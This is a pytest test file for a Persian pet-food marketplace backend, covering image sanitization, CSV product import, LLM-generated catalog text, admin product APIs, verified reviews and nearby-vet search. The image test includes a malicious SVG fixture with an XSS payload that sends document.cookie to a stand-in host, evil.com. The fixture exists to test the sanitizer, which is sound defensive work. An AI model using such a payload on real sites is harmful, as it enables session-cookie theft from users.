import pytest
import io
import uuid
from httpx import AsyncClient
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select

from src.models.user import User, UserRole
from src.models.catalog import CanonicalProduct, Category, Seller, SellerOffer, ProductReview
from src.models.order import Order, OrderItem, OrderStatus
from src.models.pet import PetSpecies
from src.core.security import create_access_token
from src.services.image_pipeline import validate_and_process_image, ImageSecurityError
from src.services.excel_import import parse_and_validate_import, commit_import_rows, generate_template_csv
from src.services.groq_service import generate_product_content


@pytest.mark.asyncio
async def test_image_pipeline_security_and_normalization():
    """Verify SVG sanitization, MIME validation, and normalization."""
    # 1. Valid PNG content
    valid_png_header = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR" + b"\x00" * 50
    res = validate_and_process_image(valid_png_header, "product.png", "image/png")
    assert res["is_sanitized"] is True
    assert res["aspect_ratio"] == "1:1"
    assert res["filename"].startswith("bonnivo_prod_")
    assert res["thumbnail_url"].startswith("/icons/products/thumb_")

    # 2. Dangerous SVG with script injection
    malicious_svg = b"""<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
        <script>fetch('http://evil.com/steal?c='+document.cookie)</script>
        <circle cx="50" cy="50" r="40" fill="red" onclick="evil()" />
        <a xlink:href="javascript:exploit()"><text>Click</text></a>
    </svg>"""
    res_svg = validate_and_process_image(malicious_svg, "vector.svg", "image/svg+xml")
    assert res_svg["is_sanitized"] is True

    # 3. Disallowed extension / MIME
    with pytest.raises(ImageSecurityError):
        validate_and_process_image(b"exec payload", "script.sh", "text/x-shellscript")


@pytest.mark.asyncio
async def test_excel_bulk_import_service(db_session: AsyncSession):
    """Verify CSV template generation, row validation preview, and transactional commit."""
    # 1. Template generation
    template = generate_template_csv()
    assert "sku,title_fa" in template
    assert "RC-CAT-ADULT-2KG" in template

    # 2. Validation with valid and invalid rows
    csv_payload = """sku,title_fa,brand,category_slug,target_species,price_tomans,stock_quantity,description_fa
VALID-SKU-1,غذای خشک گربه بونیو پرو ۲ کیلوگرم,Bonnivo,cat-food,CAT,950000,50,توضیحات تست
INVALID-ROW,,Bonnivo,cat-food,CAT,0,10,توضیحات ناقص
VALID-SKU-2,غذای کنسروی سگ رفلکس ۴۰۰ گرم,Reflex,dog-food,DOG,120000,100,کنسرو باکیفیت
"""
    preview = parse_and_validate_import(csv_payload)
    assert preview["total_rows"] == 3
    assert preview["valid_rows"] == 2
    assert preview["error_rows"] == 1
    assert preview["is_valid"] is False  # because 1 row has error

    # 3. Commit valid rows
    commit_res = await commit_import_rows(db_session, preview["rows"])
    assert commit_res["created"] == 2
    assert commit_res["failed"] == 1  # 1 errored row skipped

    # Verify products persisted in database
    q = select(CanonicalProduct).where(CanonicalProduct.sku == "VALID-SKU-1")
    p = (await db_session.execute(q)).scalars().first()
    assert p is not None
    assert p.title_fa == "غذای خشک گربه بونیو پرو ۲ کیلوگرم"
    assert p.price_tomans == 950000
    assert p.status == "PUBLISHED"


@pytest.mark.asyncio
async def test_llm_product_content_generation():
    """Verify factual grounding and Persian catalog output from raw input text."""
    raw_supplier_text = """
    Royal Canin Sterilised 37
    Complete and balanced food for neutered adult cats from 1 to 7 years old.
    After neutering, the energy needs of cats decrease.
    Helps limit the risk of excess weight gain with moderate fat.
    Adequate phosphorus content supports healthy kidneys.
    """
    res = await generate_product_content(
        source_text=raw_supplier_text,
        brand="Royal Canin",
        target_species="CAT",
    )
    assert res["success"] is True
    data = res["data"]
    assert "title_fa" in data
    assert "short_description_fa" in data
    assert "features" in data
    assert len(data["features"]) >= 3
    assert "seo_title" in data
    assert "seo_description" in data
    assert "suggested_slug" in data


@pytest.mark.asyncio
async def test_admin_product_crud_api(client: AsyncClient, db_session: AsyncSession):
    """Verify Admin can create, edit, upload images, and update product status."""
    admin_phone = f"09{uuid.uuid4().int % 1000000000:09d}"
    admin_user = User(
        phone_number=admin_phone,
        full_name="مدیر سیستم تست",
        role=UserRole.ADMIN,
    )
    db_session.add(admin_user)
    await db_session.commit()
    token = create_access_token(data={"sub": admin_user.id, "phone_number": admin_user.phone_number, "role": "ADMIN"})
    headers = {"Authorization": f"Bearer {token}"}

    # 1. Create product
    create_payload = {
        "title_fa": "غذای خشک توله سگ بونیو پاپی ۱ کیلوگرم",
        "category_slug": "dog-food",
        "target_species": "DOG",
        "brand": "Bonnivo Pro",
        "sku": "BONYO-DOG-PUPPY-1KG",
        "price_tomans": 450000,
        "old_price_tomans": 520000,
        "stock_quantity": 40,
        "size": "1kg",
        "flavor": "مرغ و تخم مرغ",
        "life_stage": "Puppy",
        "description_fa": "تغذیه بهینه برای توله سگ با قابلیت هضم عالی.",
        "status": "PUBLISHED",
    }
    resp = await client.post("/api/v1/admin/products", json=create_payload, headers=headers)
    assert resp.status_code == 200
    prod_data = resp.json()
    prod_id = prod_data["product_id"]

    # 2. Get admin product
    resp_get = await client.get(f"/api/v1/admin/products/{prod_id}", headers=headers)
    assert resp_get.status_code == 200
    assert resp_get.json()["sku"] == "BONYO-DOG-PUPPY-1KG"
    assert resp_get.json()["price_tomans"] == 450000

    # 3. Update product
    update_payload = {
        "price_tomans": 480000,
        "stock_quantity": 60,
    }
    resp_up = await client.put(f"/api/v1/admin/products/{prod_id}", json=update_payload, headers=headers)
    assert resp_up.status_code == 200

    # 4. Status toggle to ARCHIVED
    resp_st = await client.put(f"/api/v1/admin/products/{prod_id}/status", json={"status": "ARCHIVED"}, headers=headers)
    assert resp_st.status_code == 200
    assert resp_st.json()["is_active"] is False


@pytest.mark.asyncio
async def test_verified_purchase_review_flow(client: AsyncClient, db_session: AsyncSession):
    """Verify Customer can only submit verified review after completed purchase."""
    cust_phone = f"09{uuid.uuid4().int % 1000000000:09d}"
    seller_phone = f"09{uuid.uuid4().int % 1000000000:09d}"
    unique_suffix = uuid.uuid4().hex[:6]

    customer = User(
        phone_number=cust_phone,
        full_name="خریدار واقعی بونیو",
        role=UserRole.CUSTOMER,
    )
    db_session.add(customer)

    cat = Category(slug=f"health-supplements-{unique_suffix}", title_fa="مکمل و سلامت")
    db_session.add(cat)
    await db_session.flush()

    prod = CanonicalProduct(
        category_id=cat.id,
        title_fa="خمیر مالت گربه بونیو ۱۰۰ گرم",
        slug=f"bonnivo-cat-malt-paste-{unique_suffix}",
        target_species=PetSpecies.CAT,
        price_tomans=180000,
        stock_quantity=25,
        is_active=True,
    )
    db_session.add(prod)
    await db_session.flush()

    # Create seller and offer
    seller_user = User(
        phone_number=seller_phone,
        full_name="فروشگاه سلامت پت",
        role=UserRole.SELLER,
    )
    db_session.add(seller_user)
    await db_session.flush()

    seller = Seller(
        user_id=seller_user.id,
        store_name_fa="پت شاپ سلامت",
        slug="salamat-pet",
        national_id="1234567890",
        sheba_number="IR123456789012345678901234",
        phone_number="09129990009",
        city="Tehran",
        address="Tehran",
        is_verified=True,
        status="APPROVED",
    )
    db_session.add(seller)
    await db_session.flush()

    offer = SellerOffer(
        product_id=prod.id,
        seller_id=seller.id,
        price_tomans=180000,
        stock_quantity=50,
        is_active=True,
    )
    db_session.add(offer)
    await db_session.flush()

    # Create completed order for verified purchase check
    order = Order(
        user_id=customer.id,
        total_amount_tomans=180000,
        status=OrderStatus.DELIVERED,
    )
    db_session.add(order)
    await db_session.flush()

    order_item = OrderItem(
        order_id=order.id,
        offer_id=offer.id,
        seller_id=seller.id,
        product_title=prod.title_fa,
        unit_price_tomans=180000,
        quantity=1,
    )
    db_session.add(order_item)
    await db_session.commit()

    token = create_access_token(data={"sub": customer.id, "phone_number": customer.phone_number, "role": "CUSTOMER"})
    headers = {"Authorization": f"Bearer {token}"}

    # Submit review
    rev_payload = {
        "rating": 5,
        "title": "کیفیت بسیار عالی و رفع مشکل گلوله مویی",
        "comment": "گربه من بسیار راحت خورد و بعد از ۳ روز استفاده کامل مشکل برطرف شد. پیشنهاد می‌کنم.",
    }
    resp = await client.post(f"/api/v1/catalog/products/{prod.id}/reviews", json=rev_payload, headers=headers)
    assert resp.status_code == 201
    rev_data = resp.json()
    assert rev_data["is_verified_purchase"] is True
    assert rev_data["moderation_status"] == "APPROVED"

    # Verify review shows up in public product reviews
    resp_pub = await client.get(f"/api/v1/catalog/products/{prod.id}/reviews")
    assert resp_pub.status_code == 200
    pub_list = resp_pub.json()
    assert len(pub_list) == 1
    assert pub_list[0]["is_verified_purchase"] is True


@pytest.mark.asyncio
async def test_progressive_geospatial_discovery(client: AsyncClient):
    """Verify 5 KM -> 10 KM -> 20 KM progressive stepped radius expansion."""
    # Center of Tehran (Enghelab Sq) ~ lat 35.7005, lng 51.3912
    # Nearby points (within 5-10 km)
    resp = await client.get("/api/v1/discovery/nearby?lat=35.7005&lng=51.3912&category=VET")
    assert resp.status_code == 200
    data = resp.json()
    assert "active_radius_km" in data
    assert data["active_radius_km"] in [5.0, 10.0, 20.0]
    assert data["total_found"] > 0
    assert "items" in data

    # Far coordinates (e.g. 50 km away)
    resp_far = await client.get("/api/v1/discovery/nearby?lat=34.5&lng=50.5")
    assert resp_far.status_code == 200
    far_data = resp_far.json()
    assert far_data["total_found"] == 0
    assert far_data["active_radius_km"] == 20.0
    assert "هیچ مرکزی تا شعاع ۲۰ کیلومتری شما یافت نشد" in far_data["status_message"]
